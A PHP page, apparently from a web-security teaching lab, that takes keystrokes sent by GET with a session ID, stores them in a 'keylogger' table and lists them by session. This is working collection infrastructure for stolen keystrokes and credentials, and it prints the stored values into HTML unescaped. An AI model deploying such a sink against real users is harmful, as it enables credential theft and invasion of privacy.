<?php

include('../db/mysql_credentials.php');

$con = new mysqli($mysql_server, $mysql_user, $mysql_pass, $mysql_db);

if($con->connect_error) die ("Error connecting to DB");


if (isset($_GET['data']) && isset($_GET['sessid'])) {
  $stmt = $con->prepare("INSERT INTO keylogger (sessid, keystream, timestamp) VALUES (?,?, Now())");

  $sessid = $_GET['sessid'];
  $keystream = $_GET['data'];

  $stmt->bind_param("ss", $sessid, $keystream);
  $stmt->execute();

} else {
  echo ' 
    <html>
    <head>
    <link rel="stylesheet" href="../css/bootstrap.min.css">
    <style>body { padding-top: 70px; }</style>
    </head>
    <body>
  <nav class="navbar navbar-default navbar-fixed-top">
    <div class="container">
      <div class="row">
        <div class="col-md-12">
          <div class="navbar-header">
            <a href="/" class="navbar-brand">WebSec Tutorial</a>
          </div>
          <div class="collapse navbar-collapse">
            <ul class="nav navbar-nav">
              <li><a href="/">Home</a></li>
              <li class="active"><a href="/support/capture_page.php">Capture</a></li>
            </ul>
            <ul class="nav navbar-nav navbar-right">
              <li><a href="/db">DB Setup</a></li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  </nav>

    <div class="container">
    <br>
    <div class="panel panel-default">
      <div class="panel-heading"><h2 class="text-center">Logged Keys</h2></div>
      <div class="panel-body">You can log more keys by issuing a GET request to this page ('. $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] .'),
      passing a keystream and a SESSID to the page. <br><i>e.g. ' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . '?data=usernamepassword&sessid=1dhsa91h239hdas</i></div>
';

  $query = "SELECT sessid, GROUP_CONCAT(keystream SEPARATOR ' ') AS 'keystream' FROM keylogger GROUP BY sessid";
  $result = $con->query($query);

  echo "<table class='table table-striped'>";

  echo "<tr><th>SESSID</th><th>KeyStream</th></tr>";

  while($row = $result->fetch_assoc()) {

    $sessid = $row['sessid'];
    $keystream = $row['keystream'];

    echo "<tr>";
    echo "<td>$sessid</td>";
    echo "<td>$keystream</td>";

    echo "</tr>";
  }

  echo "</table>";

  echo "</div></div></html>";
}

$con->close();
